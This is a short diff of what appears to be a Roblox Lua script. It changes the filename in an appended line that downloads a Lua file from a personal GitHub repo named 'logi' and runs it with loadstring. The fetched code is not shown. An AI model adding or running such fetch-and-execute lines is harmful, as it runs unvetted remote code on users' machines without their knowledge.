@@ -901,4 +901,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/bottik.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
